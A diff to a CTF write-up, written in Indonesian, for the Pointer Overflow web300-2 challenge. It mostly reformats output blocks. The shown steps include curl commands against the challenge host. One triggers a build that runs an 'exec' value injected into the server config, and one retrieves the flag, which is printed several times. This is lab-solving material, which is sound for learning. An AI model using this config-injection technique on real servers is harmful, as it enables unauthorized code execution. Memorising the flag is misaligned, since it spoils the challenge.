@@ -341,25 +341,25 @@ Server target kali ini ngizinin `POST /api/settings` buat merge JSON ke config g
    ```bash
    curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/api/build
    
-   /api/build
-[build] newsletter generated
-[build] found exec in config; executing...
-/app
----FILES---
-./public/newsletter.html
----FLAG---
-poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
-[build] done.
+    /api/build
+    [build] newsletter generated
+    [build] found exec in config; executing...
+    /app
+    ---FILES---
+    ./public/newsletter.html
+    ---FLAG---
+    poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
+    [build] done.
    ```
    Worker nge-run Node dengan `NODE_OPTIONS` custom, otomatis nge-copy flag. Sebenarnya disini sudah muncul flag nya, dan sudah cukup.
 3. Ambil flag dari static dir:
    ```bash
    curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/flag.txt
-   
-   poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
    ```
 
 ### Flag
 
-`poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}`
+```text
+poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
+```
 
